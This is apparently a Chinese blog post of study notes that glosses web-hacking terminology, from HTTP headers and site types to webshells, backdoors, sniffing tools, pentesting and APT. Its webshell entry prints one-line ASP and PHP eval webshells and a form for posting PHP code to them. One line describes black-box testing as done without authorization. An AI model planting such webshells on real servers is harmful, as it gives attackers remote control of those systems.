---
title: Hacker的部分专业术语
date: 2021-05-16 15:53:07
tags:
- 学习笔记
categories:
- [计算机知识, Web渗透]
---

### 脚本（asp，php，jsp）

### html（css，js，html）

### HTTP协议

  超文本传输协议
  （HTTP，HyperText Transfer Protocol）是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。  

  `HTTP头`讲解：

  ```raw
  [root@bt ~]# curl-I www.baidu.com
  HTTP/1.1 200 OK
  Date:Sat, 18 Apr 2015 16:42:13GMT
  Content-Type: text/html; charset=utf-8
  Connection: Keep-Alive
  Vary: Accept-Encoding
  Set-Cookie: BAIDUID=3098620FDEE24194CF6F5A853507E9BC:FG=l; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com
  Set-Cookie: BIDUPSID=3098620FDEE24194CF6F5A853507E9BC; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com
  Set-Cookie: BDSVRTM=0; path=/
  Set-Cookie: BD_HOME=0; path=/
  Set-Cookie: H_PS_PSSID=13421_1426_13466_13074_12825_13381_12868_13322_12691_13410_10562_12722_12735_13439_13086_13477_13324_12836_13491_13162_13256_8498; path=/; domain=.baidu.com
  P3P: CP= "OTI_DSP_COR_IVA_OUR_IND_COM"
  ```

  200 响应码  
  date 日期  
  content-type 类型  
  Accept-Charset：浏览器可接收的字符集  
  Content-Length：表示请求消息正文的长度  
  Cookie：这是最重要的请求头信息之一  

<br />

  参考网站：
  [curl 的用法指南](http://www.ruanyifeng.com/blog/2019/09/curl-reference.html)  
  [HTTP响应头信息|菜鸟教程](https://www.runoob.com/http/http-header-fields.html)  
  [HTTP头部信息详解](https://www.cnblogs.com/wait59/p/13736601.html)  
  [HTTP头部详解](https://blog.csdn.net/sinat_34166518/article/details/83584910)  

### 静态网站

静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如：GIF动画、Flash动画、滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm、html、shtml等为后缀。  
如：<http://www.xxx.com/index.html>

### 动态网站

动态网站并不是指具有动画功能的网站，而是指网站内容可根据不同情况动态变更的网站，一般情况下，动态微网站通过数据库进行架构。  
动态网站除了要设计网页外，还要通过数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结尾，而静态网页一般是HTML结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站。动态网站是相对于静态网站而言。  
如：<http://xxx.com.cn/index.asp>  

判断一个网站是什么编程语言写的，网站地址末尾加上index.asp/jsp/php/html等，也可加上robots.txt，有的是没有的，防止机器爬虫  
判断Linux系统还是Windows系统，把网页地址中的文件后缀其中一个字母改为大写，如不报错，即为Windows。（Linux系统大小写敏感，Windows系统不敏感）  

### 伪静态

“伪静态”顾名思义就是一种表面上看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互的网站，具有这种特性的网页被称为“伪静态网页”。我们看到的伪静态网页其实是经过处理的，将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。  
参考网站：  
[Web安全-伪静态网页](https://blog.csdn.net/weixin_39190897/article/details/104150886)  

* CMS（B/S）
* MD5
* 肉鸡：被黑客入侵并被长期驻扎的计算机or服务器
* 抓鸡：利用大量的程序漏洞，使用自动化方式获取肉鸡的行为
* 漏洞：硬件，软件，协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等
* Webshell：通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度打的控制

* 一句话【木马】：  
  通过向服务端提交一句简短的代码，配合本地客户端实现 Webshell 功能的木马。  

  ```raw
  <%eval request(“pass”)%>
  <%execute (request(“pass”))%>
  ```

  request(“pass”) 接收客户端提交的数据，pass为执行命令的参数值。  
  eval / execute 函数执行客户端命令的内容。  

  这种木马一般会被安全狗拦截  
    如PHP的一句话木马：  

    ```php
    <?php eval($_POST[cracer]);?>
    ```

  下面的代码可以用POST的方式提交PHP语句，利用php脚本的各种函数，就可以实现执行系统命令，修改数据库、增删改文件等的各种功能。  

    ```php
    <form method=post action=http://木马地址>
         <textarea name=yourname>
               //这里写php代码
               phpinfo();
         </textarea>
         <input type=submit>
    </from>
    ```

* 提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。
* 后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。

* 跳板：使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。
* 旁站入侵：
即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。
常见的旁站查询工具有：
WebRobot、御剑、明小子和Web在线查询等。

* C段入侵：
即同C段服务器入侵，如目标ip为192.168.1.253入侵192.168.1.xxx的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。  
常用的工具有：  
Window环境——Cain  
UNIX环境——Sniffit，Snoop，Tcpdump，Dsniff，etc.  

* 渗透测试：
  * 黑盒测试：
    * 在未授权的情况下，摸你黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。
    * 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合能力（OS，Datebase，Script，code，思路，社工）
    * 思路与经验积累往往决定成败

  * 白盒测试：
    * 相对黑盒测试，白盒测试基本是从内部发起

  * 黑白盒的另一种说法：
    * 知道源代码和不知道源代码的渗透测试
这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。

* APT攻击：
  * Advanced Persistent Threat（高级可持续性攻击）
  * 是指组织（especially the government）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。
  * 特点：
    1. 极强的隐蔽性
    2. 潜伏期长，持续性强
    3. 目标性强

渗透测试的特点：  

1. 充满挑战与刺激——不达目的不罢休  
2. 思路与经验累积往往决定成败  
